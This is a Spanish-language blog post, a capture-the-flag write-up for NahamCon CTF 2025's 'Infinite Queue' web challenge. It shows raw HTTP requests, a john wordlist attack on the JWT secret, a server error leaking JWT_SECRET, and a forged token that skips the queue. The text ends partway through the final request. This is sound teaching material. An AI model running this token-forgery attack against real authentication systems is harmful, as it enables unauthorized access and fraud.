@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>NahamCon CTF 2025 | Infinite Queue :: Hackers Fight Club Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introducción Recientemente se llevó a cabo una de las conferencias virtuales más notorias de ciberseguridad: &ldquo;NahamCon&rdquo; y, como es tradición, acompañado de esta se realizó su respectivo CTF.
+Dicho CTF contaba con retos en diversas áreas ya clásicas en competencias de este estilo; particularmente, este writeup se centra en uno de la categoría Web: inifinite queue que nos sitúa hasta el final de fila ficticia para adquirir boletos del tour de una banda famosa.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://albertnath.github.io/hfc-blog/posts/nahamcon_ctf_2025_infinite_queue/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/main.min.61ebeff97afe3635753dcda5e0c7a822cb4d2ca9a4e662b6736ffb5a39b2f99a.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://albertnath.github.io/hfc-blog/favicon.png">
+<link rel="apple-touch-icon" href="https://albertnath.github.io/hfc-blog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="corrupter" />
+
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="NahamCon CTF 2025 | Infinite Queue">
+<meta property="og:description" content="Introducción Recientemente se llevó a cabo una de las conferencias virtuales más notorias de ciberseguridad: &ldquo;NahamCon&rdquo; y, como es tradición, acompañado de esta se realizó su respectivo CTF.
+Dicho CTF contaba con retos en diversas áreas ya clásicas en competencias de este estilo; particularmente, este writeup se centra en uno de la categoría Web: inifinite queue que nos sitúa hasta el final de fila ficticia para adquirir boletos del tour de una banda famosa.
+" />
+<meta property="og:url" content="https://albertnath.github.io/hfc-blog/posts/nahamcon_ctf_2025_infinite_queue/" />
+<meta property="og:site_name" content="Hackers Fight Club Blog" />
+
+  <meta property="og:image" content="https://albertnath.github.io/hfc-blog/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-06-12 13:14:58 -0600 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://albertnath.github.io/hfc-blog/">
+  <div class="logo">
+    Hackers Fight Club Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de">Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors">Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags">Categorías</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de" >Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors" >Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags" >Categorías</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts" >Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://albertnath.github.io/hfc-blog/posts/nahamcon_ctf_2025_infinite_queue/">NahamCon CTF 2025 | Infinite Queue</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">12-06-2025</time><span class="post-author">corrupter</span><span class="post-reading-time">5 min. de lectura (881 palabras)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/writeup/">Writeup</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/red-team/">Red Team</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/web/">Web</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/secure-coding/">Secure Coding</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="introducción">Introducción<a href="#introducción" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Recientemente se llevó a cabo una de las conferencias virtuales más notorias de
+ciberseguridad: &ldquo;NahamCon&rdquo; y, como es tradición, acompañado de esta se realizó su
+respectivo CTF.</p>
+<p>Dicho CTF contaba con retos en diversas áreas ya clásicas en competencias de este estilo;
+particularmente, este <em>writeup</em> se centra en uno de la categoría <em>Web</em>: <em>inifinite queue</em>
+que nos sitúa hasta el final de fila ficticia para adquirir boletos del tour de una banda famosa.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/nahamcon_ctf_2025_infinite_queue/home.png"  alt="img1"  class="center"    />
+
+
+<p>Este reto requiere explotar una vulnerabilidad sobre un método de autenticación muy usado
+actualmente: <em>JSON Web Tokens</em> (JWTs) y que, a diferencia de ataques clásicos
+que explotan secretos débiles, aprovecha malas configuraciones dejadas por el equipo de
+desarrollo en el <em>backend</em> de la aplicación.</p>
+<h2 id="desarrollo">Desarrollo<a href="#desarrollo" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Lo primero que siempre realizo al tener un reto de esta categoría en frente es una
+inspección manual para ver el comportamiento de la aplicación. Al ingresar al dominio
+notamos que tenemos que crear una cuenta para entrar en la fila de compra de boletos.</p>
+<p>Tras crear una cuenta, se nos muestra el mensaje <em>&ldquo;You are in the queue!
+Estimated wait time: 9529 minutes&rdquo;</em>. Lo que tenemos que hacer ahora es inspeccionar
+las peticiones HTTP que se realizan entre nuestro navegador y la aplicación. Para ello,
+usé <code>BurpSuite</code>. Interceptamos primero la petición de registro</p>
+<p><strong>Petición:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>POST /join_queue HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:134.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/134.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://challenge.nahamcon.com:32642/queue
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">15</span>
+</span></span><span style="display:flex;"><span>Origin: http://challenge.nahamcon.com:32642
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user_id<span style="color:#f92672">=</span>a%40a.a
+</span></span></code></pre></div><p><strong>Respuesta:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.1.3 Python/3.9.22
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">24</span> May <span style="color:#ae81ff">2025</span> 16:54:22 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">252</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;You are in the queue! Estimated wait time: 9529 minutes&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.S4KRGUg5_eKr7k0orR7ADu_XiWeaxQdgr144gYatYCk&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Vemos que el servidor regresa un token. La estructura parece ser la de un token JWT.
+Si lo decodificamos, obtenemos la siguiente información:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># Header</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Claims</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;user_id&#34;</span>: <span style="color:#e6db74">&#34;a@a.a&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;queue_time&#34;</span>: 1760793322.405517,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;exp&#34;</span>: <span style="color:#ae81ff">5348102062</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>La idea es ver qué podemos hacer con este token. Vemos que el sistema
+responde con lo siguiente al consultar el estatus de la cola:</p>
+<p><strong>Petición:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>POST /check_queue HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:134.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/134.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://challenge.nahamcon.com:31075/queue
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">177</span>
+</span></span><span style="display:flex;"><span>Origin: http://challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzk5NTI3NDU4LjQyMjEwOSwiZXhwIjo1MzQ4MDM3MTM4fQ.ABchR3XbT9gBcyisqU_ZB48sxnnLKOos2SuMtHLlMzw
+</span></span></code></pre></div><p><strong>Respuesta:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.1.3 Python/3.9.22
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">23</span> May <span style="color:#ae81ff">2025</span> 22:52:52 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">136</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Still waiting in queue. Estimated time: 858111 minutes&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;queue_position&#34;</span>:61783992,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;waiting&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;wait_minutes&#34;</span>:858111
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Tras esto, se me ocurrió que podríamos forjar nuestro token, modificando el <em>claim</em>
+<code>queue_time</code> y saltar la fila, pero para ello
+necesitaríamos el secreto con el que se firmó el mismo. Lo primero que verifiqué es si se
+trataba de algún secreto débil con <code>john</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ john --format<span style="color:#f92672">=</span>HMAC-SHA256 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt token.jwt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>HMAC-SHA256 <span style="color:#f92672">[</span>password is key, SHA256 256/256 AVX2 8x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:02 DONE <span style="color:#f92672">(</span>2025-05-24 11:08<span style="color:#f92672">)</span> 0g/s 5352Kp/s 5352Kc/s 5352KC/s <span style="color:#e6db74">&#34;chinor23&#34;</span>..*7¡Vamos!
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>También se intentó crear una <em>wordlist</em> personalizada con <code>cewl</code> sobre la
+URL raíz, pero de igual forma no se pudo obtener el secreto. Indagando
+en la página principal del sitio el footer tenía carácteres que me parecieron
+interesantes: <code>ftjy</code> así que procedí a usarlos como secreto. Al reenviar el
+token sobre el mismo <em>endpoint</em>, esto provoca que se dispare un error del
+lado del servidor y obtenemos información <em>muy</em> interesante:</p>
+<p><strong>Petición:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>POST /check_queue HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:134.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/134.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://challenge.nahamcon.com:31075/queue
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">151</span>
+</span></span><span style="display:flex;"><span>Origin: http://challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.ymFVmpr70Q4-TycbU
+</span></span></code></pre></div><p><strong>Respuesta:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">500</span> INTERNAL SERVER ERROR
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.1.3 Python/3.9.22
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">24</span> May <span style="color:#ae81ff">2025</span> 17:05:03 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">1080</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;An unexpected error occurred&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;error_details&#34;</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;debug_mode&#34;</span>:false,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#34;environment&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;GPG_KEY&#34;</span>:<span style="color:#e6db74">&#34;E3FF2839C048B25C084DEBE9B26995E310250568&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;HOME&#34;</span>:<span style="color:#e6db74">&#34;/root&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;HOSTNAME&#34;</span>:<span style="color:#e6db74">&#34;infinite-queue-0ca560b3c629abff-6466846744-2qdnw&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;JWT_SECRET&#34;</span>:<span style="color:#e6db74">&#34;4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_PORT&#34;</span>:<span style="color:#e6db74">&#34;tcp://34.118.224.1:443&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_PORT_443_TCP&#34;</span>:<span style="color:#e6db74">&#34;tcp://34.118.224.1:443&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_PORT_443_TCP_ADDR&#34;</span>:<span style="color:#e6db74">&#34;34.118.224.1&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_PORT_443_TCP_PORT&#34;</span>:<span style="color:#e6db74">&#34;443&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_PORT_443_TCP_PROTO&#34;</span>:<span style="color:#e6db74">&#34;tcp&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_SERVICE_HOST&#34;</span>:<span style="color:#e6db74">&#34;34.118.224.1&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_SERVICE_PORT&#34;</span>:<span style="color:#e6db74">&#34;443&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;KUBERNETES_SERVICE_PORT_HTTPS&#34;</span>:<span style="color:#e6db74">&#34;443&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;LANG&#34;</span>:<span style="color:#e6db74">&#34;C.UTF-8&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;PATH&#34;</span>:<span style="color:#e6db74">&#34;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,<span style="color:#e6db74">&#34;PYTHON_SHA256&#34;</span>:<span style="color:#e6db74">&#34;8c136d199d3637a1fce98a16adc809c1d83c922d02d41f3614b34f8b6e7d38ec&#34;</span>,<span style="color:#e6db74">&#34;PYTHON_VERSION&#34;</span>:<span style="color:#e6db74">&#34;3.9.22&#34;</span>,<span style="color:#e6db74">&#34;WERKZEUG_SERVER_FD&#34;</span>:<span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Invalid crypto padding&#34;</span>,<span style="color:#e6db74">&#34;request_data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjoxNzYwNzkzMzIyLjQwNTUxNywiZXhwIjo1MzQ4MTAyMDYyfQ.ymFVmpr70Q4-TycbU&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2025-05-24T17:05:03.023602&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>¡Bingo! Ya podemos forjar nuestro token. Dado que lo que parece determinar
+si seguimos en espera es el <em>claim</em> <code>queue_time</code>, entonces lo modificamos
+con el valor <code>00000.00000</code>. Podemos firmar nuestro token con el secreto
+obtenido y enviarlo:</p>
+<p><strong>Petición:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>POST /check_queue HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:134.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/134.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://challenge.nahamcon.com:31075/queue
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">158</span>
+</span></span><span style="display:flex;"><span>Origin: http://challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYUBhLmEiLCJxdWV1ZV90aW1lIjowLjEsImV4cCI6NTM0ODAzNjQ5MH0.A-KeWH05z3ZmQo22_XbzB67LV7ITw_hrAPlFxunQ3aU
+</span></span></code></pre></div><p><strong>Respuesta:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.1.3 Python/3.9.22
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">23</span> May <span style="color:#ae81ff">2025</span> 23:00:12 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">84</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Your turn has arrived! You can now purchase tickets.&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;ready&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Si optamos por usar el token en el navegador, veriamos que la compra puede realizarse y basta con dar
+click en el boton para obtener la flag. Usando <code>BurpSuite</code>, podíamos mandar una petición a
+<code>/purchase</code> de la siguiente forma:</p>
+<p><strong>Petición:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>POST /purchase?html<span style="color:#f92672">=</span>true HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:134.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/134.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer: http://challenge.nahamcon.com:31075/queue
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">158</span>
+</span></span><span style="display:flex;"><span>Origin: http://challenge.nahamcon.com:31075
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
